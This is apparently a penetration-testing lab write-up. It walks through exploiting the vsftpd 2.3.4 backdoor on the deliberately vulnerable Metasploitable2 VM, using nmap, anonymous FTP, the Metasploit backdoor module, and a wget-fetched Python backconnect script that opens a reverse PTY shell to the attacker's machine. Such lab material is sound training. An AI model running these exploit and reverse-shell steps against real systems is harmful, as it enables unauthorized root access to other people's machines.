<hr>
Metasploitable2 is a virtual machine that is an intentionally vulnerable operating system based on Ubuntu. Designed for testing security tools, and common vulnerabilities.<br>
Download link here: <https://metasploit.help.rapid7.com/docs/metasploitable-2><br>
<br>
Metasploitable2 has a large attack surface, but we will be focusing on FTP in this post which looks at the vulnerable version of vsftpd 2.3.4
<hr>
#### Nmap scan
My Metasploitable2 IP is 192.168.1.78<br>
`nmap -sC -sV -oA initial-scan 192.168.1.78`

<hr>
#### Anonymous Login
From the scan we can see the version of FTP which is vsftpd 2.3.4, but we can also see that anonymous logins are allowed.
As a starting point lets see if there's any loot.<br>
`ftp 192.168.1.78`<br>
<br>
Because its anonymous login, we can use either ftp or anonymous for the username and any password we want. For example use<br>
`ftp:ftp`<br>
![](\images\metasploitable\vsftpd234\2.png)<br><br>
List the files within FTP<br>
`ls`<br>
![](\images\metasploitable\vsftpd234\3.png)<br><br>
There is 1 file in ftp called "nothing_here". We can download the file to our local machine with<br> `get nothing_here`<br><br>
There is nothing there, This was just an example of anonymous logins
<hr>
#### vsftpd 2.3.4
Back to the version of FTP which is vsftp 2.3.4<br>
using searchsploit for vsftpd returns these results<br>
`searchsploit vsftpd`<br>
![](\images\metasploitable\vsftpd234\4.png)<br><br>
There is a backdoor Metasploit module for our vsftpd (2.3.4) version.
<hr>
#### Metasploit
Start Metasploit<br>
`msfconsole`<br><br>
Search for where the exploit lives in metasploit<br>
`search vsftpd 2.3.4`<br>
![](\images\metasploitable\vsftpd234\5.png)<br><br>
We are going to use the backdoor which is #3<br>
`use exploit/unix/ftp/vsftpd_234_backdoor`<br><br>
Lets look at the options we need to set.<br>
`options`<br>
![](\images\metasploitable\vsftpd234\6.png)<br><br>
RHOSTS setting is currently empty, and RHOSTS is required for this exploit to work. Set it to your Metasploitable2 IP<br>
(RHOSTS - Remote Host)<br>
`set rhost 192.168.1.78`<br><br>
Show options again, the remote host has been set<br>
`options`
![](\images\metasploitable\vsftpd234\7.png)<br><br>
At this point we are good to exploit<br>
`exploit`<br>
![](\images\metasploitable\vsftpd234\8.png)<br><br>
Congratulations, We are in!<br><br>
If we type id, it tells us that we are root.<br>
`id`<br>

This isn't much of a shell, Lets upgrade it!<br>
Leave this metasploit terminal running we'll need it later<br>
<hr>
#### Upgrading the shell to a fully interactive PTY
We could of placed a meterpreter payload in our exploit, but we are going to get a python PTY shell, that lets you use nano/vi to write files, shows where you are in the file structure, and lets you auto complete with TAB.<br>
This has a bit more of a setup, but it's good practice as we wont always be able to use Metasploit to open meterpreter shells.<br><br>
Lets begin<br>

Open a new terminal<br>
Download python pty shells from github - <https://github.com/infodox/python-pty-shells><br>
`git clone https://github.com/infodox/python-pty-shells.git`<br><br>
cd into python-pty-shells folder<br>
`cd python-pty-shells`<br>

We will be using 2 scripts
* tcp_pty_backconnect.py
* tcp_pty_shell_handler.py

Edit  tcp_pty_backconnect.py script with your favorite text editor (I use VIM) and change the "lhost" to your Kali machines IP, and save it.<br><br>
Make note of "lhost" and "lport" we will need them<br>
My Kali machines IP is 192.168.1.240<br>
![](\images\metasploitable\vsftpd234\10.png)<br><br>

Set up a listener to catch the shell, Remember the "lhosts" and "lport" from tcp_pty_backconnect.py they're used in this command<br>
`python tcp_pty_shell_handler.py -b 192.168.1.240:31337`<br>
![](\images\metasploitable\vsftpd234\11.png)<br><br>

Open a new terminal in python-pty-shells folder and setup a basic http server with python (default port is 8000)<br>
The reason we setup a http server is so we can download tcp_pty_backconnect.py from our Kali machine to the metasploitable machine<br>
`python -m SimpleHTTPServer`<br>
![](\images\metasploitable\vsftpd234\12.png)<br><br>

Go back to the metasploit shell<br>
We will download the script in /root with the name of pty_shell<br>
`wget 192.168.1.240:8000/tcp_pty_backconnect.py -O /root/pty_shell`<br>
![](\images\metasploitable\vsftpd234\13.png)<br><br>

Still in the metasploit shell, cd into root directory and list the files, you should see pyt_shell in the output<br>
`cd /root`<br>
`ls`<br>
![](\images\metasploitable\vsftpd234\14.png)<br><br>

Run the pty_shell script<br>
`python pty_shell`<br>
![](\images\metasploitable\vsftpd234\15.png)<br><br>
Have a look at the listener that we set up earlier to see if you caught the shell<br>
![](\images\metasploitable\vsftpd234\16.png)<br><br>

Congrats, you just upgraded to a fully interactive PTY shell.<br><br>
There are multiple ways of achieving this, for example we could of uploaded the backconnect script straight into the ftp server. This is just the way I did it.<br>
Thanks for reading<br>
Happy Hacking!
